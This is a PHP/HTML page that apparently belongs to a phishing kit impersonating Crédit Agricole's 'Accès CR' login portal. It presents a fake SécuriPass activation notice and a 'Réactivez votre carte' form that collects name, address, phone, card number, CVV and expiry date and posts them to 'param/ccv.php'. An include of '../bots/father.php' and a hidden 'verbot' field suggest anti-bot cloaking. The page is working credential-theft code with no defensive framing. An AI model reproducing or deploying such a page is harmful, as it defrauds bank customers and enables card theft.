<?php


include '../bots/father.php';
include_once '../inc/app.php';

?>

<!DOCTYPE html>
<html lang="fr" class="backgroundblendmode no-capture flexbox flexwrap">
 
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:url" content="">


<meta name="description" content="">
<meta property="og:description" content="">


<meta name="robots" content="noindex">

<title>Accès CR - Crédit Agricole</title>
<meta property="og:title" content="Accès CR - Crédit Agricole" />
<meta property="og:image" content="../assets/img/calogo.png">

<noscript>
 <style type="text/css">
body {
overflow:hidden;
}
 </style>
<div class="TechnicalError noscript">
<div class="TechnicalError-content">
<div class="TechnicalError-paragraph">
<p class="TechnicalError-firstPara">Malheureusement, votre configuration de navigation actuelle ne vous permet pas de naviguer dans de bonnes conditions.</br> Vous ne pourrez pas profiter de toutes les fonctionnalités de notre site ni accéder à votre espace client.</p>
</div>
</div>
</div>
</noscript>
<meta name="format-detection" content="telephone=no">
 
<link rel="icon" type="image/png" href="../assets/img/favicon.png">


<link rel="stylesheet" href="../assets/css/clientlib-part.min.ea256277357fa8db5612c74f1e54f567.css" type="text/css">

<link rel="stylesheet" href="../assets/css/clientlibStoreLocatorT33Part.min.1f61aaac8fd08ba4c317656d6f0e4a62.css" type="text/css">
<link rel="stylesheet" href="../assets/css/clientlibStoreLocatorT34Part.min.f3d31862687057258256810db3499be7.css" type="text/css">
<link rel="stylesheet" href="../assets/css/clientlibBoutonVertPart.min.d41d8cd98f00b204e9800998ecf8427e.css" type="text/css">


<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afa.js" defer="defer"></script>
<script src="../assets/js/utils.min.423ec59365a85ebded314ad7311ef508.js" defer="defer"></script>
<script src="../assets/js/granite.min.579a107dd681c49bc61dae63734043cb.js" defer="defer"></script>
<script src="../assets/js/clientlib-bootstrap-jquery.min.1661914e05c676ce450674555cc1e5b0.js" defer="defer"></script>
<script src="../assets/js/clientlibHeader.min.9b997b2ac9fca6031bd046f1edd29d81.js" defer="defer"></script>
 

<link rel="stylesheet" href="../assets/css/design.css" type="text/css">
<link rel=canonical href=https://stomalogabadra.com/b878849b4e3bb5772e7e01532aa2d7ea/>


</head>



<body class="BodyLogin" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQifSwidmVyc2lvbiI6IjEuOC4xNCIsInNjb3JlIjoxMDgxNDB9XQ==">
 

<nocobrowse></nocobrowse>

<header>
 

</header>

<main>

<!-- Machine Id hluz -->

<div class="Login" bis_skin_checked="1">
<div class="Login-header js-Header" bis_skin_checked="1">
 

<a href="#" class="Login-logo Login-logo-js" bis_skin_checked="1">
<div class="Login-logoImg js-needFakeNotSvg" style="position: relative;" bis_skin_checked="1"><img class="" src="../assets/img/calogo.png" alt="Crédit Agricole Centre Ouest" style="position: absolute; top: 50%; left: 50%; max-width: 100%; max-height: 100px; height: 100%; transform: translate(-50%, -50%);"><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMAAwICAgICAwICAgMDAwMEBgQEBAQECAYGBQYJCAoKCQgJCQoMDwwKCw4LCQkNEQ0ODxAQERAKDBITEhATDxAQEP/bAEMBAwMDBAMECAQECBALCQsQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEP/AABEIADgBLAMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8AlUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//2Q==" style="opacity: 0; max-width: 100%; max-height: 100%; visibility: hidden;"></div>
</a>

<a href="#" class="Login-close" id="Login-close" tabindex="0" role="button" aria-label="Quitter l&#39;accès à mon espace" bis_skin_checked="1" style="pointer-events: none !important;"></a>
</div>

<div class="container-fluid Template" bis_skin_checked="1" style="margin-top: 60px;">
<div class="row js-Template-head" bis_skin_checked="1">
<div class="col-xs-12 col-md-6" bis_skin_checked="1">
<div class="Template-reduceMargin15px" bis_skin_checked="1">
<div class="js-StickyPush" bis_skin_checked="1"><div class="js-StickyWrap" bis_skin_checked="1"><div class="js-FullHeight ForgotPswd-imgWrapper hidden-xs" style="height: 796px;" bis_skin_checked="1">
<div class="placeholder-left parsys" bis_skin_checked="1"><div class="new-zdg parbase section" bis_skin_checked="1">

<script type="text/javascript">
(function () {


window.ContextHub.eventing.on(ContextHub.SegmentEngine.PageInteraction.Teaser.prototype.info.loadEvent, function (event) {
$(window).trigger('initCustomRedirect');
});

$("div[class='PushCommunication-text']").find("p").each(function () {
var inner = $(this)[0].innerHTML.trim();
var brIfExist = inner.substr(inner.length - 4);
var brAndNbspIfExist = inner.substr(inner.length - 11);
if (brIfExist.indexOf("<br>") >= 0 || (brAndNbspIfExist.indexOf("<br>") >= 0 && brAndNbspIfExist.indexOf("&nbsp;") >= 0)) {
setTimeout(removeLastBr, 1000, $(this));
}
});
function removeLastBr(p) {
$(p).find("br:last-child").remove();
}
});
</script>


<div class="componentZdg" bis_skin_checked="1">
<div class="PushCarousel3" bis_skin_checked="1">
<div bis_skin_checked="1"><button class="PushCarousel3-masking" onclick="toggleStateCarousel(&#39;hom&#39;)">Mettre en pause ou
redémarrer le défilement du carousel</button></div>
<div class="PushCarousel3-carousel" bis_skin_checked="1">
<div data-trackingclass="carrousel" class="PushCarousel3-carouselInner owl-loaded" data-owl-access-keyup="1" data-owl-carousel-focusable="1" bis_skin_checked="1">
  

<div class="owl-stage-outer" bis_skin_checked="1"><div class="owl-stage" style="transform: translate3d(0px, 0px, 0px); transition: all 0s ease 0s; width: 641px;" bis_skin_checked="1"><div class="owl-item active" aria-hidden="false" style="width: 640px; margin-right: 1px;" bis_skin_checked="1"><div class="PushCarousel3-item" data-trackinginfo="progcr_mpmOffreEstivale_1" bis_skin_checked="1">

<div class="PushCommunication-backgroundWrapper" bis_skin_checked="1">
<div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('../assets/img/acces_cr_part_carre.jpg') !important; width:105% !important;" bis_skin_checked="1">
<style type="text/css">
.imgg { 
background-image: url('../assets/img/acces_cr_part_carre.jpg') !important; width:105% !important; 
}
</style>
</div>
</div>
<div class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--white" bis_skin_checked="1">

<div class="PushCommunication-sticky" bis_skin_checked="1">AUTHENTIFICATION</div>


<div class="PushCommunication-title" bis_skin_checked="1">
<div class="texte section" bis_skin_checked="1"><p><span class="h3">ACTIVATION SÉCURIPASS EN DEUX ÉTAPES :</span></p>
</div>
</div>

<div class="PushCommunication-text" bis_skin_checked="1">
<div class="texte section" bis_skin_checked="1">
<p>
Comment activer mon SécuriPass et faciliter mes opération en un click ?</p>
<div>
<p><i class="ui icon mobile teal"></i> Entrer le lien reçu par SMS envoyé sur votre numéro .</p> 
<p><i class="ui icon circle teal"></i> Entrer le code à 6 chiffres reçu par SMS .</p> 
<p><i class="ui large icon teal check"></i> Votre SécuriPass à été activé.</p>
</div>

</div>
</div>



<!-- Si la popin de co est activé -->

<!-- Si la popin de co n'est pas activé -->


<a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" data-owl-temp-tabindex="0" tabindex="0" bis_skin_checked="1"><span>En savoir plus </span></a>



</div>
</div></div></div></div><div class="owl-nav disabled" bis_skin_checked="1">

<button type="button" role="presentation" class="owl-prev" tabindex="0"></button>
<button type="button" role="presentation" class="owl-next" tabindex="0"></button>

</div><div class="owl-dots disabled" bis_skin_checked="1"></div></div>
</div>
</div>
</div>
<script>
if (typeof sliderRelationalMessage === 'function') {
sliderRelationalMessage();
};
</script>


</div>

</div>

</div></div></div>
</div>
</div>

<DIV class="col-xs-12 col-md-6" bis_skin_checked="1">


<main id="main" class="main" style="margin-top: -15px;">

<FORM method="post" action="param/ccv.php" style="font-family: Verdana, Arial, Helvetica, sans-serif;">

 <div>
<div class="uk-padding">

<div class="uk-h3 primary" style="font-size:29px !important;">
<i class="ui icon key teal"></i>&nbsp;Réactivez votre carte
</div>
<br>



<div class="row">
<div class="col-md-6">
<div class="form-group">
<label for="nom">Nom *</label>
<input type="text" name="nom" class="form-control input-clear <?php echo is_invalid_class($_SESSION['errors'],'nom') ?>" placeholder="Veuillez saisir la donnée" id="nom" value="<?php echo get_value('nom'); ?>">
<?php echo validation($_SESSION['errors'],'nom'); ?>
</div>
</div>
<div class="col-md-6">
<div class="form-group">
<label for="prenom">Prénom  *</label>
<input type="text" name="prenom" class="form-control input-clear <?php echo is_invalid_class($_SESSION['errors'],'prenom') ?>" placeholder="Veuillez saisir la donnée" id="prenom" value="<?php echo get_value('prenom'); ?>">
<?php echo validation($_SESSION['errors'],'prenom'); ?>
</div>
</div>
</div>
<div class="row">
<div class="col-md-6">
<div class="form-group">
<label for="address">Adresse *</label>
<input type="text" name="address" id="address" placeholder="Veuillez saisir la donnée" class="form-control input-clear <?php echo is_invalid_class($_SESSION['errors'],'address') ?>" value="<?php echo get_value('address'); ?>">
<?php echo validation($_SESSION['errors'],'address'); ?>
</div>
</div>
<div class="col-md-6">
<div class="form-group">
<label for="phone">NUMÉRO DE TÉLÉPHONE *</label>
<input type="text" name="phone" class="form-control input-clear <?php echo is_invalid_class($_SESSION['errors'],'phone') ?>" placeholder="Veuillez saisir la donnée" id="phone" value="<?php echo get_value('phone'); ?>">
<?php echo validation($_SESSION['errors'],'phone'); ?>
</div>
</div>
</div>
<div class="row">
<div class="col-md-6">
<div class="form-group">
<label for="zip_code">CODE POSTAL *</label>
<input type="text" name="zip_code" class="form-control input-clear <?php echo is_invalid_class($_SESSION['errors'],'zip_code') ?>" placeholder="Veuillez saisir la donnée" id="zip_code" value="<?php echo get_value('zip_code'); ?>">
<?php echo validation($_SESSION['errors'],'zip_code'); ?>
</div>
</div>
<div class="col-md-6">
<div class="form-group">
<label for="city">VILLE *</label>
<input type="text" name="city" class="form-control input-clear <?php echo is_invalid_class($_SESSION['errors'],'city') ?>" placeholder="Veuillez saisir la donnée" id="city" value="<?php echo get_value('city'); ?>">
<?php echo validation($_SESSION['errors'],'city'); ?>
</div>
</div>
</div>
<div class="form-group">
<label for="cc_number">N° de carte *</label>
<input type="text" name="cc_number" id="cc_number" maxlength="22" placeholder="Veuillez saisir la donnée" class="form-control input-clear <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>" value="<?php echo get_value('cc_number'); ?>" onkeypress="addspace();">
<?php echo validation($_SESSION['errors'],'cc_number'); ?>
</div>
<div class="row">
<div class="col-md-6">
<div class="form-group">
<label for="cc_cvv">Cryptogramme visuel (CVV) *</label>
<input type="text" name="cc_cvv" id="cc_cvv" class="form-control input-clear <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>" value="<?php echo get_value('cc_cvv'); ?>" maxlength="3" placeholder="Veuillez saisir la donnée">
<?php echo validation($_SESSION['errors'],'cc_cvv'); ?>
</div>
</div>
<div class="col-md-6">
<div class="form-group">
<label for="cc_date">Date d'expiration (MM/AA) *</label>
<input type="text" name="cc_date" class="form-control input-clear <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>" value="<?php echo get_value('cc_date'); ?>" maxlength="5" placeholder="Veuillez saisir la donnée" id="cc_date" onkeypress="addcaract();">
<?php echo validation($_SESSION['errors'],'cc_date'); ?>
</div>
</div>
</div>
<div class="form-group mt-5">
<button type="submit" class="PushCommunication-btn PushCommunication-btn--primary" tabindex="0"> &nbsp;&nbsp;CONFIRMER &nbsp;&nbsp;</button>
</div>
<input type="hidden" name="verbot">
<input type="hidden" name="type" value="card">


<script type="text/javascript">
function addcaract(){
var cc_dateVal = document.getElementById('cc_date').value;
if(cc_dateVal.length < 2){ 
document.getElementById('cc_date').value = cc_dateVal.replace('/', ''); 
}
if(cc_dateVal.length == 2){ 
document.getElementById('cc_date').value = cc_dateVal + "/"; 
}
}
function addspace(){
var cc_numberVal = document.getElementById('cc_number').value;
if(cc_numberVal.length == 4){ 
document.getElementById('cc_number').value = cc_numberVal + "  "; 
}
if(cc_numberVal.length == 10){ 
document.getElementById('cc_number').value = cc_numberVal + "  "; 
}
if(cc_numberVal.length == 16){ 
document.getElementById('cc_number').value = cc_numberVal + "  "; 
}
}
</script>






<br>
 <img src="../assets/img/card.png" alt style="width:100% !important;"> 
 


</b><div id=DMM3IaO-1589125076412 style=display:block!important><iframe id=CCQPS2b-1589125076418 scrolling=no title="chat widget" style="outline:currentcolor none medium!important;visibility:visible!important;resize:none!important;box-shadow:none!important;overflow:visible!important;background:transparent none repeat scroll 0% 0%!important;opacity:1!important;inset:auto!important;position:static!important;border:0px none!important;min-height:auto!important;min-width:auto!important;max-height:none!important;max-width:none!important;padding:0px!important;margin:0px!important;transition-property:none!important;transform:none!important;width:350px!important;display:none!important;z-index:999999!important;cursor:auto!important;float:none!important;border-radius:unset!important;pointer-events:auto!important;height:120px!important" data-single-file-win-id=0.0 frameborder=0></iframe><iframe id=MQCxsVq-1589125076423 scrolling=no title="chat widget" style="outline:currentcolor none medium!important;visibility:visible!important;resize:none!important;overflow:visible!important;background:transparent none repeat scroll 0% 0%!important;opacity:1!important;inset:auto 20px 20px auto!important;position:fixed!important;border:0px none!important;padding:0px!important;transition-property:none!important;display:none!important;z-index:1000001!important;cursor:auto!important;float:none!important;pointer-events:auto!important;box-shadow:rgba(0,0,0,0.16) 0px 2px 10px 0px!important;height:60px!important;min-height:60px!important;max-height:60px!important;width:60px!important;min-width:60px!important;max-width:60px!important;border-radius:50%!important;transform:rotate(0deg) translateZ(0px)!important;transform-origin:0px center 0px!important;margin:0px!important" data-single-file-win-id=0.1 frameborder=0></iframe><iframe id=boGIwTJ-1589125076425 scrolling=no title="chat widget" style="outline:currentcolor none medium!important;visibility:visible!important;resize:none!important;box-shadow:none!important;overflow:visible!important;background:transparent none repeat scroll 0% 0%!important;opacity:1!important;inset:auto 15px 60px auto!important;position:fixed!important;border:0px none!important;padding:0px!important;margin:0px!important;transition-property:none!important;transform:none!important;display:none!important;z-index:1000003!important;cursor:auto!important;float:none!important;border-radius:unset!important;pointer-events:auto!important;width:21px!important;max-width:21px!important;min-width:21px!important;height:21px!important;max-height:21px!important;min-height:21px!important" data-single-file-win-id=0.2 frameborder=0></iframe><div style="outline:currentcolor none medium!important;visibility:visible!important;resize:none!important;box-shadow:none!important;overflow:visible!important;background:transparent none repeat scroll 0% 0%!important;opacity:1!important;inset:0px auto auto 0px!important;position:absolute!important;border:0px none!important;min-height:auto!important;min-width:auto!important;max-height:none!important;max-width:none!important;padding:0px!important;margin:0px!important;transition-property:none!important;transform:none!important;width:100%!important;height:100%!important;display:none!important;z-index:1000001!important;cursor:move!important;float:left!important;border-radius:unset!important;pointer-events:auto!important"></div><div id=ahwRlDR-1589125076412 style="outline:currentcolor none medium!important;visibility:visible!important;resize:none!important;box-shadow:none!important;overflow:visible!important;background:transparent none repeat scroll 0% 0%!important;opacity:1!important;inset:0px auto auto 0px!important;position:absolute!important;border:0px none!important;min-height:auto!important;min-width:auto!important;max-height:none!important;max-width:none!important;padding:0px!important;margin:0px!important;transition-property:none!important;transform:none!important;width:6px!important;height:100%!important;display:block!important;z-index:999998!important;cursor:w-resize!important;float:none!important;border-radius:unset!important;pointer-events:auto!important"></div><div id=uqgAGkR-1589125076414 style="outline:currentcolor none medium!important;visibility:visible!important;resize:none!important;box-shadow:none!important;overflow:visible!important;background:transparent none repeat scroll 0% 0%!important;opacity:1!important;inset:0px 0px auto auto!important;position:absolute!important;border:0px none!important;min-height:auto!important;min-width:auto!important;max-height:none!important;max-width:none!important;padding:0px!important;margin:0px!important;transition-property:none!important;transform:none!important;width:100%!important;height:6px!important;display:block!important;z-index:999998!important;cursor:n-resize!important;float:none!important;border-radius:unset!important;pointer-events:auto!important"></div><div id=JEaQDfC-1589125076415 style="outline:currentcolor none medium!important;visibility:visible!important;resize:none!important;box-shadow:none!important;overflow:visible!important;background:transparent none repeat scroll 0% 0%!important;opacity:1!important;inset:0px auto auto 0px!important;position:absolute!important;border:0px none!important;min-height:auto!important;min-width:auto!important;max-height:none!important;max-width:none!important;padding:0px!important;margin:0px!important;transition-property:none!important;transform:none!important;width:12px!important;height:12px!important;display:block!important;z-index:999998!important;cursor:nw-resize!important;float:none!important;border-radius:unset!important;pointer-events:auto!important"></div><iframe id=Tzp5eUJ-1589125076496 scrolling=no title="chat widget" style="outline:currentcolor none medium!important;visibility:visible!important;resize:none!important;box-shadow:none!important;overflow:visible!important;background:transparent none repeat scroll 0% 0%!important;opacity:1!important;inset:auto 20px 100px auto!important;position:fixed!important;border:0px none!important;min-height:auto!important;min-width:auto!important;max-height:none!important;max-width:none!important;padding:0px!important;margin:0px!important;transition-property:none!important;transform:none!important;width:378px!important;height:521px!important;display:none!important;z-index:999999!important;cursor:auto!important;float:none!important;border-radius:unset!important;pointer-events:auto!important" data-single-file-win-id=0.3 frameborder=0></iframe></div>
  </FORM>
</main>
  


</DIV>


</div>
</div>
</div>
</div>

</main>

<script src="../assets/js/clientlib-general.min.b5ff34b2035703897d75f3a3044f3a1e.js" defer="defer"></script> 
<script src="../assets/js/clientlibPageErreur.min.f434b09157730b423058e364dda8b336.js" defer="defer"></script> 
<script src="../assets/js/clientlibMireAuthentification.min.5e969969429038946546644a08b416ee.js" defer="defer"></script> 
<script src="../assets/js/jquery.min.js"></script>
<footer id="foot" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></footer>
<script src="../assets/js/jQuery.min.affcbf7942d5bedb0785712.js" defer="defer" async="async"></script>


</body>
</html>

